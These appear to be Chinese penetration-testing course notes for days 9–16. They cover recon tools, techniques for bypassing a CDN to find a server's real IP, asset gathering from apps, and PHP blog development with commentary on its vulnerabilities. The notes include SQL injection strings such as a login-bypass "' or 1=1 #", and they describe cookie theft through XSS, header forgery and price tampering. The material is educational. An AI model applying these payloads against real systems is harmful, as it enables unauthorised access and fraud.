<p>2、服务信息获取-协议应用&amp;内网资产<br>旁注：查询同一服务器下的不同WEB应用<br>C段：查询同一网段下，不同服务器部署的不同WEB应用<br>nmap target -Pn -osscan-limit -sV</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Pn：不检测主机存活 -osscan-limit:扫操作系统 </span><br><span class="line"></span><br><span class="line">-sV：探测打开的端口以确定服务/版本信息</span><br></pre></td></tr></table></figure>

<p>3、阻碍信息获取-CDN&amp;WAF&amp;负载&amp;防火墙<br>超级ping:CDN服务识别（全国个地去ping目标地址，看访问的IP地址是否不同）<br>wafw00f识别waf、看图识别</p>
<p>4、ldb识别负载均衡</p>
<p>使用工具去检测负载均衡是否存在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#相关利用项目：</span><br><span class="line">Masscan:https://github.com/robertdavidgraham/masscan</span><br><span class="line">Wafwoof:https://github.com/Enablesecurity/wafw00f</span><br><span class="line">Kali上自带Nmap,Masscan,lbd等项目，超级ping:ping.chinaz.com</span><br><span class="line">超级ping:CDN服务识别</span><br><span class="line">Masscan:端口扫描，应用协议</span><br><span class="line">Wafw00f:Web应用防护防火墙识别</span><br><span class="line">namp：端口扫描，应用协议，防火墙识别</span><br><span class="line">lbd:负载均衡，广域网负载均衡，应用层负载均衡</span><br></pre></td></tr></table></figure>



<h1 id="第9天-信息打点-CDN烧过篇-漏洞回链8接口探针-全网扫指-反向件"><a href="#第9天-信息打点-CDN烧过篇-漏洞回链8接口探针-全网扫指-反向件" class="headerlink" title="第9天 信息打点-CDN烧过篇&amp;漏洞回链8接口探针&amp;全网扫指&amp;反向件"></a>第9天 信息打点-CDN烧过篇&amp;漏洞回链8接口探针&amp;全网扫指&amp;反向件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：</span><br><span class="line">1、CDN知识-工作原理及阻碍</span><br><span class="line">2、CDN配置-域名&amp;区域&amp;类型</span><br><span class="line">3、CDN绕过-靠谱十余种技战法</span><br><span class="line">4、CDN绑定-HOSTS绑定指向访问</span><br></pre></td></tr></table></figure>

<blockquote>
<p>CDN 是构建在数据网络上的一种分布式的内容分发网。 CDN的作用是采用流媒体服务器集群技术，克服单机系统输出带宽及并发能力不足的缺点，可极大提升系统支持的并发流数目，减少或避免单点失效带来的不良影响。</p>
</blockquote>
<p>#前置知识<br>1.传统访问：用户访问域名-&gt;解析服务器IP-&gt;访问目标主机<br>2.普通CDN:用户访问域名-&gt;CDN节点-&gt;真实服务器IP-&gt;访问目标主机<br>3.带WAF的CDN:用户访问域名-&gt;CDN节点(WAF)-&gt;真实服务器IP-&gt;访问目标主机</p>
<p>CDN的使用:在阿里云平台上去进行按每一步配置即可。</p>
<p>#判定标准：<br>nslookup,各地ping(出现多个IP即启用CDN服务)<br>#参考知识：<br><a href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a><br><a href="https://www.cnblogs.com/blacksunny/p/5771827.html">https://www.cnblogs.com/blacksunny/p/5771827.html</a><br>子域名，去掉www,邮件服务器，国外访问，证书查询，APP抓包<br>黑暗空间引擎（yofo），通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">演示案例：</span><br><span class="line">真实应用-CDN绕过-漏洞&amp;遗留文件</span><br><span class="line">原理： 利用ssrf使得服务器主动请求VPS地址，此时通过在VPS地址监听请求即可得知真实地址。（相当于目标服务器主动请求VPS地址，vps会监听到真实地址）</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-子域名查询操作</span><br><span class="line">原理：配置CDN时管理员考虑费用问题可能会将子域名排除在外，此时通过手机子域名信息即可得到真实地址（用于子域名应用和根域名应用部署在同一服务器的情况下）</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-接口查询国外访问</span><br><span class="line">原理：配置CDN时选择地域可能会仅设置成国内生效，此时使用国外地址访问获得真实地址</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-主动邮件配合备案</span><br><span class="line">原理:通过系统功能（如：密码找回发送邮件，查看邮件发送方地址找寻），通过备案信息确认，一般是通过备案的地点去判定</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-全网扫描FuckCDN</span><br><span class="line">原理：扫描全球ip匹配web内容，实用工具匹配扫描网段title信息。需要大量时间很多情况下，不过也是最稳定的方法。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#参考知识：</span><br><span class="line">https://zhuanlan.zhihu.com/p/33440472</span><br><span class="line">https://www.cnblogs.com/blacksunny/p/5771827.html</span><br><span class="line">子域名，去掉www,邮件服务器，国外访问，证书查询，APP抓包</span><br><span class="line">黑暗空间引擎，通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</span><br><span class="line">#案例资源：</span><br><span class="line">超级Ping:https://www.17ce.com/</span><br><span class="line">接口查询：https://get-site-ip.com/</span><br><span class="line">国外请求：https://tools.ipip.net/cdn.php</span><br><span class="line">全网扫描：https://github.com/Tai7sy/fuckcdn</span><br></pre></td></tr></table></figure>

<h1 id="第10天-信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取"><a href="#第10天-信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取" class="headerlink" title="第10天 信息打点-APP&amp;小程序篇&amp;抓包封包&amp;XP框架&amp;反编译&amp;资产提取"></a>第10天 信息打点-APP&amp;小程序篇&amp;抓包封包&amp;XP框架&amp;反编译&amp;资产提取</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#### 知识点：</span><br><span class="line"></span><br><span class="line">1、小程序-外在-资产收集</span><br><span class="line">2、APP-外在&amp;内在-资产收集</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#### 演示案例：</span><br><span class="line"></span><br><span class="line">APP-外在抓包-Fd&amp;茶杯&amp;Burp</span><br><span class="line"></span><br><span class="line">APP-外在封包-封包监听工具</span><br><span class="line">使用封包监听也可抓到数据包</span><br></pre></td></tr></table></figure>

<p>APP-内在提取-ApplnfoScanner</p>
<blockquote>
<p>一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。</p>
</blockquote>
<p>APP-内在搜索-反编译载入IDEA</p>
<ul>
<li>APP-资源提取-安装泡&amp;资源文件<br>使用安卓修改大师导入apk文件，可对域名资源进行收集</li>
</ul>
<p>​	还可使用IDEA对反编译出的项目进行资源收集</p>
<ul>
<li>APP-框架使用-Xposed&amp;JustTrustMe</li>
</ul>
<p>某些apk存在加壳的情况，会扫描失败，可以通过工具判断apk是否加壳</p>
<p>可通过安装xp框架的方式进行脱壳处理</p>
<p>小程序-微信-电脑版登录启动抓包分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">APP安卓入手</span><br><span class="line">1、外在-抓包封包-资产安全测试</span><br><span class="line">资产收集-资源提取-ICO,MD5,HASH-黑暗引擎搜索相关资产</span><br><span class="line">2、外在-功能逻辑</span><br><span class="line">3、内在-反编译-JAVA代码代码审计</span><br><span class="line">4、内在-反编译-提取RES资源-黑暗资产收集</span><br></pre></td></tr></table></figure>

<h1 id="第11天信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Ar灯塔"><a href="#第11天信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Ar灯塔" class="headerlink" title="第11天信息打点-红队工具篇&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suize水泽&amp;Ar灯塔"></a>第11天信息打点-红队工具篇&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suize水泽&amp;Ar灯塔</h1><p>知识点：<br>1、网络空间四大引擎-Fofa&amp;Quake&amp;shodan&amp;2 oomeye I<br>2、自动化信息收集项目-ARL灯塔&amp;Suize水泽s Kunyui坤舆<br>3、单点功能信息收集项目-企查：子域名指纹识别：社工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##黑暗引擎：</span><br><span class="line">https://fofa.so</span><br><span class="line">https://quake.360.cn</span><br><span class="line">https://www.shodan.io</span><br><span class="line">https://www.zoomeye.org</span><br><span class="line">##自动项目：</span><br><span class="line">https://github.com/knownsec/Kunyu</span><br><span class="line">https://github.com/0x727/shuize 0x727</span><br><span class="line">https://github.com/TophantTechnology/ARL</span><br><span class="line">##相关资源：</span><br><span class="line">https://forum.ywhack.com/center.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、演示案例：网络空间-Fofa&amp;Quake&amp;Shodan&amp;Zoomeye</span><br><span class="line">工具测评网络空间四大黑暗彩擎集合版项目</span><br><span class="line">finger:通过调用zoomeyes和fofa的接口实现</span><br><span class="line">	通过fofa和zoomeyes两个接口去进行信息搜集</span><br><span class="line">2工具测评-自动化收集-ARL灯塔&amp;Suize水泽&amp;Kunyu</span><br><span class="line">Kunyu：通过调用zoomeyes API实现资产信息和漏洞信息收集 还能够通过一个api去进行相关漏洞的搜集</span><br><span class="line">ARL灯塔：自动化信息收集工具</span><br><span class="line">水泽Suize：认为是暂时最好用的一个工具，能够搜集到更加全面的信息。</span><br><span class="line">3、工具测评-单点功能器企查查&amp;子域名&amp;指纹识别&amp;社工</span><br><span class="line">相比自动化全部搜集的工具，所能搜集到的信息更加准确，但都是同一个方面的。</span><br><span class="line">上述工具都可以在菱角社区去找到。</span><br></pre></td></tr></table></figure>

<h1 id="第12天：PHP开发-个人博客项目-文章功能显示-数据库操作-数据接受"><a href="#第12天：PHP开发-个人博客项目-文章功能显示-数据库操作-数据接受" class="headerlink" title="第12天：PHP开发-个人博客项目_文章功能显示_数据库操作_数据接受"></a>第12天：PHP开发-个人博客项目_文章功能显示_数据库操作_数据接受</h1><p>接下来几天就都是PHP相关的知识，但是由于现在的社会环境，PHP语言的逐渐淘汰，所以PHP的相关笔记就粗略大概过一遍。</p>
<p>首先ctf中注意的是php中的单双引号的区别，单引号不解析变量，双引号能够解析变量</p>
<p>知识点：<br>1、PHP入门-语法&amp;提交等<br>2、MsQL入门-数据库操作<br>3、HTML+CS5入门-样式编排</p>
<p>演示案例：<br>小迪博客文章阅读功能初步实现</p>
<p>实现功能：<br>前端文章导航，点入内容显示，更改I♪显示不同内容<br>实现步骤：<br>1、前端页面显示编写-HTML&amp;CSS<br>HTML 是一种用于创建网页的标记语言，全称为超文本标记语言。使用html构造显示前端文章导航站点。</p>
<p>2、数据库文章数据导入-MySQL工操作<br>首先配置数据库连接–验证数据库配置–定义数据查询到的变量并赋值–连接具体表–执行具体字段显示</p>
<p>每次查询数据时都需要执行核查数据库配置的语句所以可以把数据库连接配置写成配置文件</p>
<p>3、PHP操作MYSQL编写-PHP变量提交<br>要实现提交一个参数传到数据库中查询，需要先通过GET获取提交的参数，然后通过数据库语法（where id &#x3D; ?）指定查询内容(此处因为没有对传入的参数进行限制就导致了sql注入，例如where id&#x3D;1 union select name from admin)</p>
<p>除了使用GET传参外，还可以使用PSOT和REQUEST传参，这样就是sql注入中的get方式和post方式注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">组件：</span><br><span class="line">Navicat:操作数据库</span><br><span class="line">Dreamweaver:前端页面设计</span><br><span class="line">PhpStorm:PHP开发IDE</span><br><span class="line">phpStudy:PHP搭建环境</span><br></pre></td></tr></table></figure>

<h1 id="第13天-PHP开发个人博客项目8-文件操作类-编辑器-上传下载删除读写"><a href="#第13天-PHP开发个人博客项目8-文件操作类-编辑器-上传下载删除读写" class="headerlink" title="第13天 PHP开发个人博客项目8&amp;文件操作类&amp;编辑器&amp;上传下载删除读写"></a>第13天 PHP开发个人博客项目8&amp;文件操作类&amp;编辑器&amp;上传下载删除读写</h1><h4 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h4><p>1、文件操作类代码编写<br>2、文件上传&amp;下载&amp;删除</p>
<p>3、文件内容&amp;读取&amp;写入<br>4、第三方编辑器引用实例</p>
<h4 id="演示案例：小迪博客-文件操作-上传-下载-删除-读取-写入等"><a href="#演示案例：小迪博客-文件操作-上传-下载-删除-读取-写入等" class="headerlink" title="演示案例：小迪博客-文件操作&amp;上传&amp;下载&amp;删除&amp;读取&amp;写入等"></a>演示案例：小迪博客-文件操作&amp;上传&amp;下载&amp;删除&amp;读取&amp;写入等</h4><p>#文件上传类：-任意文件上传<br>1、代码自主写<br>2、外部编辑器源码引用<br>3、开发框架引用</p>
<p>#文件下载类：-任意文件下载<br>1、直连URL访问<br>2、传参头部修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直连下载会暴露文件存储路径，如果服务器端的文件存储路径包含敏感信息，建议使用 PHP 内置的 readfile()函数来直接输出文件内容，以避免泄露敏感信息。同时，可以设置响应头信息中的 Content-Disposition 属性为inline，使浏览器将文件直接显示在页面中，而不是下载到本地。</span><br><span class="line">传参下载可能存在参数注入攻击的风险，因此在接收和处理来自客户端的参数时，应该对输入值进行过滤和验证，避免恶意用户利用特殊字符或脚本代码等手段构造攻击请求。例如，可以使用</span><br><span class="line">PHP 内置的 filter_input() 函数来对参数值进行过滤，或使用正则表达式来匹配合法的参数格式。</span><br><span class="line">在下载文件之前，应该对用户身份进行验证，确保只有具备相应权限的用户才能访问和下载文件。例如，在使用传参下载时，可以检查用户的登录状态和角色权限，避免未经授权的下载操作。</span><br><span class="line">对于需要下载的文件，建议对其类型、大小、来源和安全性等进行检查和限制，避免下载恶意软件、病毒或大型文件等对服务器端和客户端带来的负担和安全威胁。例如，可以使用</span><br><span class="line">PHP 内置的 mime_content_type() 函数检查文件 MIME 类型，或使用 filesize() 函数检查文件大小，并在前端添加文件大小限制。对于上传到服务器的文件，可以使用防病毒软件和防火墙等工具对文件进行检查和过滤。</span><br><span class="line">//http://www.xiaodi.com/soft/软件.zip</span><br><span class="line">//http://www.xiaodi.com/soft/down.php?filename=.zip</span><br></pre></td></tr></table></figure>

<p>#文件删除类-任意文件删除1、文件删除<br>2、文件夹删除<br>删除文件使用unlink()函数，删除文件夹使用rmdir()函数。</p>
<p>#文件内容操作类-任意文件读取&amp;写入<br>1、文件读取<br>2、文件写入</p>
<p>文件包含漏洞<br>1、本地文件包含<br>2、远程文件包含<br>web漏洞核心<br>1、可控变量<br>2、特定函数</p>
<h1 id="第14天-PHP开发-个人博客项目8输入输出类-留言板8访问IP-UA头来源"><a href="#第14天-PHP开发-个人博客项目8输入输出类-留言板8访问IP-UA头来源" class="headerlink" title="第14天 PHP开发-个人博客项目8输入输出类&amp;留言板8访问IP&amp;UA头来源"></a>第14天 PHP开发-个人博客项目8输入输出类&amp;留言板8访问IP&amp;UA头来源</h1><h4 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h4><h5 id="1、PHP-全局变量-SERVER"><a href="#1、PHP-全局变量-SERVER" class="headerlink" title="1、PHP-全局变量_SERVER"></a>1、PHP-全局变量_SERVER</h5><p>利用全局变量可以查看服务器和执行环境信息</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">一些PHP中的全局变量</span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REMOTE_PORT&#x27;] //端口。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REMOTE_ADDR&#x27;] //当前用户 IP</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REMOTE_HOST&#x27;] //当前用户主机名 </span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_NAME&#x27;] //服务器主机的名称。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;PHP_SELF&#x27;]//正在执行脚本的文件名</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;argv&#x27;] //传递给该脚本的参数。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;argc&#x27;] //传递给程序的命令行参数的个数。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;GATEWAY_INTERFACE&#x27;]//CGI 规范的版本。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_SOFTWARE&#x27;] //服务器标识的字串</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_PROTOCOL&#x27;] //请求页面时通信协议的名称和版本</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REQUEST_METHOD&#x27;]//访问页面时的请求方法</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;REQUEST_URI&#x27;] //URL路径</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;QUERY_STRING&#x27;] //查询(query)的字符串。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;DOCUMENT_ROOT&#x27;] //当前运行脚本所在的文档根目录</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_ACCEPT&#x27;] //当前请求的 Accept: 头部的内容。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_ACCEPT_CHARSET&#x27;] //当前请求的 Accept-Charset: 头部的内容。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_ACCEPT_ENCODING&#x27;] //当前请求的 Accept-Encoding: 头部的内容</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_ACCEPT_LANGUAGE&#x27;];//浏览器语言</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_CONNECTION&#x27;] //当前请求的 Connection: 头部的内容。例如：“Keep-Alive”。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_HOST&#x27;] //获取当前程序所在主机,当前请求的 Host: 头部的内容。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_REFERER&#x27;] //链接到当前页面的前一页面的 URL 地址。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTP_USER_AGENT&#x27;] //当前请求的 User_Agent: 头部的内容。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;HTTPS&#x27;]//如果通过https访问,则被设为一个非空的值(on)，否则返回off</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SCRIPT_FILENAME&#x27;] #当前执行脚本的绝对路径名。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_ADMIN&#x27;] #管理员信息</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_PORT&#x27;] #服务器所使用的端口</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SERVER_SIGNATURE&#x27;] #包含服务器版本和虚拟主机名的字符串。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;PATH_TRANSLATED&#x27;] #当前脚本所在文件系统（不是文档根目录）的基本路径。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;SCRIPT_NAME&#x27;] #包含当前脚本的路径。这在页面需要指向自己时非常有用。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;PHP_AUTH_USER&#x27;] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;PHP_AUTH_PW&#x27;] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。</span></span><br><span class="line"><span class="comment">// $_SERVER[&#x27;AUTH_TYPE&#x27;] #当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型</span></span><br></pre></td></tr></table></figure>

<p>例如获取并返回访问者UA头信息，若此时功能点有获取并展示UA的功能，可以尝试进行抓包修改ua头为js代码，此时就造成了xss注入。</p>
<p>(任何将你所输入的展示在页面中的，都可能会存在xss的相关漏洞)、</p>
<h5 id="2、MYSQL-插入语法INSERT"><a href="#2、MYSQL-插入语法INSERT" class="headerlink" title="2、MYSQL-插入语法INSERT"></a>2、MYSQL-插入语法INSERT</h5><h5 id="3、输入输出-XSS-反射-存储"><a href="#3、输入输出-XSS-反射-存储" class="headerlink" title="3、输入输出-XSS&amp;反射&amp;存储"></a>3、输入输出-XSS&amp;反射&amp;存储</h5><p>输入框输入js语句（例如：)会导致浏览器在显示时会将语句执行，从而弹窗的操作（XSS反射）<br>留言板输入js语句后，因为留言板的功能会将语句保存并展示，就造成了语句存储在了数据库中就导致了xss存储型注入，利用存储型注入可以获取用户cookie。</p>
<h5 id="4、安全问题-XSS跨站-CSRF等"><a href="#4、安全问题-XSS跨站-CSRF等" class="headerlink" title="4、安全问题-XSS跨站&amp;CSRF等"></a>4、安全问题-XSS跨站&amp;CSRF等</h5><p>全局变量$_SERVER中有&#x2F;&#x2F; $_SERVER[‘HTTP_REFERER’] &#x2F;&#x2F;链接到当前页面的前一页面的 URL 地址。使用这一变量可以获取访问该链接前的上一个链接地址，在预防CSRF（跨站脚本注入）中可以起到验证跳转地址是否为恶意地址，起到防范作用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CSRF:</span><br><span class="line">要成功实施 CSRF（跨站请求伪造）攻击，通常需要满足一定的前提条件，包括：</span><br><span class="line">1、 目标网站存在漏洞：CSRF 攻击的基本原理是利用用户在访问目标网站时已经登录过的认证信息，因此目标网站必须存在相应的漏洞才能被攻击者利用。例如，目标网站没有进行有效的身份验证或令牌校验，允许从外部发送请求等。</span><br><span class="line">2、用户已经登录目标网站：由于 CSRF攻击需要利用用户已经登录过的认证信息，因此攻击者必须确保受害用户在攻击发起时已经登录了目标网站，并且浏览器保存了相关的 Cookie 或Session 信息。</span><br><span class="line">3、攻击者能够构造恶意请求：为了实施 CSRF攻击，攻击者需要能够构造出目标网站所接受的合法请求格式，并将其发送到目标网站。</span><br><span class="line"></span><br><span class="line">要和另一个后边会涉及到的CSOP进行区分</span><br></pre></td></tr></table></figure>

<h4 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h4><h5 id="小迪博客输入输出-留言板-访问获取"><a href="#小迪博客输入输出-留言板-访问获取" class="headerlink" title="小迪博客输入输出&amp;留言板&amp;访问获取"></a>小迪博客输入输出&amp;留言板&amp;访问获取</h5><p>通过输入输出、留言板实现xss反射型和存储型注入</p>
<h5 id="墨者靶场-IP地址伪造来源-来源页伪造"><a href="#墨者靶场-IP地址伪造来源-来源页伪造" class="headerlink" title="墨者靶场-IP地址伪造来源&amp;来源页伪造"></a>墨者靶场-IP地址伪造来源&amp;来源页伪造</h5><p>通过burp抓包修改refer字段绕过网页的访问限制（来源页伪造）<br>网站存在IP地址限制访问，通过抓包修改来源IP实现绕过</p>
<p>只有当代码中获取IP为$_SERVER[“HTTP_X_FORWORDED_FOR”]时才可通过抓包改包实现绕过，其他的获取ip的方法可能无法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拓展：</span><br><span class="line">ctf中常考的http相关内容</span><br><span class="line">从本地访问：  修改http报文中的XFF，X-Real-IP，Client-IP</span><br><span class="line">从哪里来： Reference</span><br><span class="line">要用什么浏览器：User-Agent</span><br><span class="line">代理： via</span><br></pre></td></tr></table></figure>

<h1 id="第15天-PHP开发-个人博客项目-登录验证-Cookie-Session-验证码安全"><a href="#第15天-PHP开发-个人博客项目-登录验证-Cookie-Session-验证码安全" class="headerlink" title="第15天 PHP开发-个人博客项目&amp;登录验证&amp;Cookie&amp;Session&amp;验证码安全"></a>第15天 PHP开发-个人博客项目&amp;登录验证&amp;Cookie&amp;Session&amp;验证码安全</h1><h4 id="知识点：-2"><a href="#知识点：-2" class="headerlink" title="知识点："></a>知识点：</h4><p>1、后台验证-登录用户逻辑安全<br>2、后台验证-COOKIE&amp;SESSION<br>3、后台验证-验证码&amp;万能密码等<br>万能密码：判断是否登录成功是看将提交的用户密码带入数据库进行查询后是否返回数据或返回行数是否对应。<br>因为出巡过程中是将参数带入到数据库查询，select * from data where username&#x3D;‘admin’ and pass&#x3D;‘pass’<br>此时构造用户名为 ’ or 1&#x3D;1 # 带入到数据库中查询就为 select * from data where username&#x3D;’ ’ or 1&#x3D;1 # and pass&#x3D;‘pass’<br>此时假 或 真 为真 后面的语句通过#注释，即可绕过登录判定<br>验证码安全：验证码不失效，可通过burp抓包再不修改验证码的情况下进行密码替换。</p>
<h4 id="登录验证的流程："><a href="#登录验证的流程：" class="headerlink" title="登录验证的流程："></a>登录验证的流程：</h4><p>1、发送登录请求帐号密码<br>2、接受帐号密码<br>3、判断帐号密码的准确性<br>正确成功登录-&gt;跳转成功页面<br>错误失败登录-&gt;重新登录<br>HTTP是无状态的协议，所以为了记录身份状态信息会使用cookie和session来存储。<br>后台管理系统有多个文件页面，为了方便验证，一般会选用cookie或session进行验证<br>cookie：身份验证存储到客户端浏览器内<br>cookie安全：cookie修改 伪造 盗取<br>session:身份验证存储到服务端服务器内<br>session安全：劫持</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie 和 Session 是两种常见的 Web 应用程序状态管理机制，用于在客户端和服务器端之间保存用户数据并实现用户身份认证。它们的不同点如下：</span><br><span class="line"></span><br><span class="line">1、存储位置：Cookie 保存在客户端（浏览器）中，而 Session 保存在服务器端。</span><br><span class="line"></span><br><span class="line">2、数据安全性：Cookie 中存储的数据可以被客户端篡改和查看，因此需要进行加密处理或者设置 HttpOnly 属性来防止 XSS 攻击；Session 中存储的数据只有存在服务器端，因此相对更安全。</span><br><span class="line"></span><br><span class="line">3、存储容量：Cookie 的存储容量通常比较小，一般限制在 4KB 左右；Session 的存储容量相对更大。</span><br><span class="line"></span><br><span class="line">4、生命周期：Cookie 可以设置生命周期，可以在浏览器关闭后仍然保持一段时间；Session 默认情况下在浏览器关闭后就会失效，或者等待一定时间后自动过期。</span><br><span class="line"></span><br><span class="line">5、应用场景：Cookie 主要用于实现无状态的 HTTP 协议下的用户身份验证、记住密码等功能，适合于分布式系统和负载均衡环境；Session 主要用于保存用户的会话信息，适合于需要维护会话状态的应用场景。</span><br><span class="line"></span><br><span class="line">总之，在选择 Cookie 和 Session 进行状态管理时，需要根据具体的应用需求和安全性要求进行选择。对于敏感数据和操作，建议采用 Session 来维护会话状态，并采取相应的加密和验证措施来提高数据安全性；对于较为简单的用户身份认证和状态管理，可以使用 Cookie 方便快捷地实现。</span><br></pre></td></tr></table></figure>

<h4 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h4><p>小迪博客-后台登录&amp;COOKIE&amp;SESSION<br>本地靶场-某CMS后台登录验证COOKIE脆弱<br>burp抓包修改cookie信息绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">补充：</span><br><span class="line">在CTF比赛中，Cookie相关的题目还是比较多的， 特别是JWT验证这个方面，还是很重要的。</span><br></pre></td></tr></table></figure>

<h1 id="第16天-PHP开发-个人博客项目-JS-Ajax-前端逻辑-购物-登录-上传"><a href="#第16天-PHP开发-个人博客项目-JS-Ajax-前端逻辑-购物-登录-上传" class="headerlink" title="第16天 PHP开发-个人博客项目&amp;JS-Ajax&amp;前端逻辑&amp;购物&amp;登录&amp;上传"></a>第16天 PHP开发-个人博客项目&amp;JS-Ajax&amp;前端逻辑&amp;购物&amp;登录&amp;上传</h1><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><h5 id="1、Js前端验证-文件上传"><a href="#1、Js前端验证-文件上传" class="headerlink" title="1、Js前端验证-文件上传"></a>1、Js前端验证-文件上传</h5><p>对上传文件的后缀名进行验证，符合要求的才能上传，可以通过PHP或者JS代码实现。<br>两种去验证的区别：<br>PHP验证的代码看不到只能黑盒测试<br>JS验证的代码的可以看到的白盒测试<br>JS禁用可以绕过前端验证</p>
<h5 id="2、Js-Ajax传递-登录-状态"><a href="#2、Js-Ajax传递-登录-状态" class="headerlink" title="2、Js-Ajax传递-登录-状态"></a>2、Js-Ajax传递-登录-状态</h5><blockquote>
<p>js ajax 请求-&gt;返回-&gt;读取返回的数据-&gt;JS ajax代码进行解析-&gt;结果<br>php 请求-&gt;返回-&gt;返回结果（服务器不会理会你自慰）</p>
</blockquote>
<p>Ajax接收infocode参数判断是否验证成功。可通过burp抓包修改参数绕过登录验证。</p>
<h5 id="3、JS-Ajax传递-购物-参数"><a href="#3、JS-Ajax传递-购物-参数" class="headerlink" title="3、JS-Ajax传递-购物-参数"></a>3、JS-Ajax传递-购物-参数</h5><p>演示案例</p>
<h6 id="1、文件上传-类型-过滤"><a href="#1、文件上传-类型-过滤" class="headerlink" title="1、文件上传-类型-过滤"></a>1、文件上传-类型-过滤</h6><p>设计：通过JavaScript进行文件后缀筛选验证</p>
<h6 id="2、状态回显-登录-状态码"><a href="#2、状态回显-登录-状态码" class="headerlink" title="2、状态回显-登录-状态码"></a>2、状态回显-登录-状态码</h6><p>设计：通过Ajax传递数据进行用户登录验证</p>
<h6 id="3、参数修改-购物一参数修改"><a href="#3、参数修改-购物一参数修改" class="headerlink" title="3、参数修改-购物一参数修改"></a>3、参数修改-购物一参数修改</h6><p>设计：通过Ajax传递数据进行购物验证</p>
<p>设计1：商品价格以前端设置价格为准，数据接收价格后运算<br>通过修改前端传递的价格和数量绕过<br>设计2：商品价格以数据库对应价格为准，数据接收价格后运算<br>虽然价格取自数据库，但是判断还是由JS代码判断，修改价格仍可绕过<br>设计3：商品价格以数据库对应价格为准，数据只接受数量后运算<br>此时判断之前也会从数据库取价格，但是因为数量是由js传递的，修改数量换成小数或者负数可以实现绕过<br>设计4：商品价格以数据库对应价格为准，数据只接受数量后做过滤运算</p>
